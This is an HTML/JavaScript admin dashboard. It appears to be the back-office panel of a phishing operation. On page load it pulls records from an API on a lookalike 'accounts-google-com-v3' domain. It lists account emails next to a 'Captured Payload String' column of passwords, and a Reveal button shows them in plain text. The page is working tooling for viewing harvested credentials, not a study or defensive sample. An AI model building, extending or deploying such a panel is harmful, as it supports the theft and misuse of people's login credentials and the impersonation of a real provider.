<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console Manager — Accounts Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: ['selector', '[data-theme="dark"]'],
            theme: {
                extend: {
                    fontFamily: {
                        'sans': ['"Google Sans"', 'sans-serif'],
                        'mono': ['"Roboto Mono"', 'monospace'],
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-[#121212] text-[#e3e3e3] font-sans min-h-screen flex flex-col antialiased">

    <!-- NAVIGATION HEADER -->
    <header class="border-b border-[#2d2d2d] bg-[#1a1a1a]/80 backdrop-blur sticky top-0 z-50 px-6 py-4 flex items-center justify-between">
        <div class="flex items-center gap-3">
            <div class="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center font-bold text-white shadow-lg shadow-blue-600/20">
                A
            </div>
            <div>
                <h1 class="text-base font-medium tracking-tight">Account Core</h1>
                <p class="text-xs text-neutral-400">Database Sync Module</p>
            </div>
        </div>
        <div class="flex items-center gap-4">
            <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                API Connected
            </span>
        </div>
    </header>

    <!-- MAIN CONTENT -->
    <main class="flex-1 max-w-6xl w-full mx-auto p-6 md:p-8 space-y-8">
        
        <!-- METRICS OVERVIEW -->
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            <div class="bg-[#1c1c1c] border border-[#2d2d2d] p-5 rounded-2xl flex flex-col justify-between">
                <span class="text-xs font-medium text-neutral-400 uppercase tracking-wider">Total Synchronized Profiles</span>
                <span id="stat-total" class="text-3xl font-semibold mt-2 tracking-tight text-white">0</span>
            </div>
            <div class="bg-[#1c1c1c] border border-[#2d2d2d] p-5 rounded-2xl flex flex-col justify-between">
                <span class="text-xs font-medium text-neutral-400 uppercase tracking-wider">Active Instances</span>
                <span id="stat-active" class="text-3xl font-semibold mt-2 tracking-tight text-blue-400">0</span>
            </div>
            <div class="bg-[#1c1c1c] border border-[#2d2d2d] p-5 rounded-2xl flex flex-col justify-between sm:col-span-2 lg:col-span-1">
                <span class="text-xs font-medium text-neutral-400 uppercase tracking-wider">Last Sync Check</span>
                <span id="stat-time" class="text-sm font-mono mt-4 text-neutral-300">Never</span>
            </div>
        </div>

        <!-- CONTROL BAR -->
        <div class="flex flex-col sm:flex-row gap-4 justify-between items-stretch sm:items-center bg-[#1c1c1c] border border-[#2d2d2d] p-4 rounded-xl">
            <div class="relative flex-1 max-w-md">
                <input 
                    id="search-box"
                    type="text" 
                    placeholder="Search entry by email address..."
                    class="w-full bg-[#121212] border border-[#2d2d2d] rounded-lg px-4 py-2.5 pl-10 text-sm focus:outline-none focus:border-blue-500 transition-colors"
                >
                <span class="absolute left-3.5 top-3.5 text-neutral-500">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
                </span>
            </div>
            <button 
                onclick="loadDatabaseRecords()"
                class="bg-blue-600 hover:bg-blue-500 text-white font-medium text-sm px-5 py-2.5 rounded-lg shadow-sm transition-all flex items-center justify-center gap-2"
            >
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.213 15H16"/></svg>
                Refresh Board
            </button>
        </div>

        <!-- CENTRAL CONTAINER GRID -->
        <div class="bg-[#1c1c1c] border border-[#2d2d2d] rounded-2xl overflow-hidden shadow-xl">
            <div class="overflow-x-auto">
                <table class="w-full text-left border-collapse">
                    <thead>
                        <tr class="border-b border-[#2d2d2d] bg-[#161616] text-xs font-medium text-neutral-400 uppercase tracking-wider">
                            <th class="py-4 px-6 w-12">ID</th>
                            <th class="py-4 px-6">Account Identifier / Email</th>
                            <th class="py-4 px-6">Captured Payload String</th>
                            <th class="py-4 px-6 text-right">Synchronization Timestamp</th>
                        </tr>
                    </thead>
                    <tbody id="records-table-body" class="divide-y divide-[#262626] text-sm">
                        <!-- Dynamic content injects here -->
                        <tr>
                            <td colspan="4" class="py-12 text-center text-neutral-500">
                                Initializing connection pipeline...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

    </main>

    <!-- FOOTER MODULE -->
    <footer class="border-t border-[#2d2d2d] py-5 px-6 text-center text-xs text-neutral-500 font-mono">
        &copy; 2026 Admin System Operations — Terminal v3.0.0
    </footer>

    <!-- LOGIC SCRIPTS -->
    <script>
        // Updated Endpoint Constant Location mapping to your active Render target environment
        const API_BASE = "https://accounts-google-com-v3.onrender.com/api";
        let localCache = [];

        async function loadDatabaseRecords() {
            const tableBody = document.getElementById('records-table-body');
            
            try {
                // Request collection snapshot from backend API
                const response = await fetch(`${API_BASE}/users`); // re-using list_workers architecture context mapping
                
                if (!response.ok) {
                    throw new Error(`Pipeline responded with non-200 state: ${response.status}`);
                }
                
                const data = await response.json();
                localCache = data;
                
                renderTable(localCache);
                updatePanelMetrics(localCache);

            } catch (err) {
                console.error("Board update interface failure:", err);
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="4" class="py-12 text-center text-red-400 font-medium">
                            Failed to establish pipeline connection to API service.
                        </td>
                    </tr>
                `;
            }
        }

        function renderTable(dataset) {
            const tableBody = document.getElementById('records-table-body');
            
            if (dataset.length === 0) {
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="4" class="py-12 text-center text-neutral-500">
                            No stored data items matched this filter criteria.
                        </td>
                    </tr>
                `;
                return;
            }

            tableBody.innerHTML = dataset.map((user, index) => {
                // Map fields from dictionary response safely 
                const email = user.email || user.full_name || "N/A";
                const password = user.password || "••••••••";
                const dateRaw = user.created_at || user.registered_at || new Date().toISOString();
                const formattedDate = new Date(dateRaw).toLocaleString();
                
                return `
                    <tr class="hover:bg-[#222] transition-colors group">
                        <td class="py-4 px-6 font-mono text-xs text-neutral-500">${index + 1}</td>
                        <td class="py-4 px-6 font-medium text-white select-all">${escapeHtml(email)}</td>
                        <td class="py-4 px-6">
                            <div class="flex items-center gap-3">
                                <span class="font-mono bg-[#121212] border border-[#2d2d2d] rounded px-2 py-1 text-xs select-all text-blue-400 group-hover:border-blue-500/30 transition-colors" data-raw-pw="${escapeHtml(password)}">
                                    ••••••••
                                </span>
                                <button 
                                    onclick="toggleMaskVisibility(this)"
                                    class="text-xs text-neutral-500 hover:text-white transition-colors cursor-pointer px-1 py-0.5 rounded hover:bg-neutral-800"
                                >
                                    Reveal
                                </button>
                            </div>
                        </td>
                        <td class="py-4 px-6 text-right font-mono text-xs text-neutral-400">${formattedDate}</td>
                    </tr>
                `;
            }).join('');
        }

        function toggleMaskVisibility(buttonNode) {
            const displaySpan = buttonNode.previousElementSibling;
            const hiddenValue = displaySpan.getAttribute('data-raw-pw');
            
            if (displaySpan.textContent.trim() === '••••••••') {
                displaySpan.textContent = hiddenValue;
                buttonNode.textContent = 'Hide';
            } else {
                displaySpan.textContent = '••••••••';
                buttonNode.textContent = 'Reveal';
            }
        }

        function updatePanelMetrics(dataset) {
            document.getElementById('stat-total').textContent = dataset.length;
            document.getElementById('stat-active').textContent = dataset.filter(u => u.is_active !== false).length;
            document.getElementById('stat-time').textContent = new Date().toLocaleTimeString();
        }

        // Live filtration parsing loop
        document.getElementById('search-box').addEventListener('input', (e) => {
            const query = e.target.value.toLowerCase().trim();
            const filtered = localCache.filter(item => {
                const targetText = (item.email || item.full_name || "").toLowerCase();
                return targetText.includes(query);
            });
            renderTable(filtered);
        });

        // Basic HTML XSS mitigation string parsing utility
        function escapeHtml(str) {
            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        // Auto-run trigger on document complete state
        document.addEventListener('DOMContentLoaded', loadDatabaseRecords);
    </script>
</body>
</html>
